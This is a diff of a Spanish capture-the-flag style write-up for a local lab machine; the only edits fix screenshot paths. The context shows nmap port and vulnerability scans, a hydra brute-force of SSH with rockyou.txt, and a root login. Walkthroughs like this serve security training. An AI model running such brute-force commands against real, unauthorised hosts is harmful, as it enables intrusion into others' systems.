@@ -6,7 +6,7 @@ En esta máquina, vamos a empezar con el escaneo básico de puertos, usando el c
 nmap -sS -p- 172.17.0.2 -n -Pn -vvv --open --min-rate 2000 -oN ports
 ```
 
-![Pasted image 20251008164017](../../../../Anexos/Pasted%20image%2020251008164017.png)
+![Pasted image 20251008164017](../../../Anexos/Pasted%20image%2020251008164017.png)
 
 Vemos que solamente está abierto el **puerto 22 SSH**, así que vamos a lanzar directamente unos scripts básicos de reocnocimiento, así como conocer la versión que corre el servicio:
 
@@ -14,7 +14,7 @@ Vemos que solamente está abierto el **puerto 22 SSH**, así que vamos a lanzar 
 nmap --script vuln -p22 172.17.0.2 -vvv -oN vuln
 ```
 
-![Pasted image 20251008165211](../../../../Anexos/Pasted%20image%2020251008165211.png)
+![Pasted image 20251008165211](../../../Anexos/Pasted%20image%2020251008165211.png)
 
 Al no encontrar nada, vamos directamente a probar hacer fuerza bruta con hydra, usando el comando:
 
@@ -22,7 +22,7 @@ Al no encontrar nada, vamos directamente a probar hacer fuerza bruta con hydra, 
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I
 ```
 
-![Pasted image 20251008165757](../../../../Anexos/Pasted%20image%2020251008165757.png)
+![Pasted image 20251008165757](../../../Anexos/Pasted%20image%2020251008165757.png)
 
 Ya tenemos acceso a la máquina. Ahora, usamos el siguiente comando para conectarnos:
 
@@ -30,6 +30,6 @@ Ya tenemos acceso a la máquina. Ahora, usamos el siguiente comando para conecta
 sudo ssh root@172.17.0.2
 ```
 
-![Pasted image 20251008170017](../../../../Anexos/Pasted%20image%2020251008170017.png)
+![Pasted image 20251008170017](../../../Anexos/Pasted%20image%2020251008170017.png)
 
 Ejecutamos whoami y... root!!
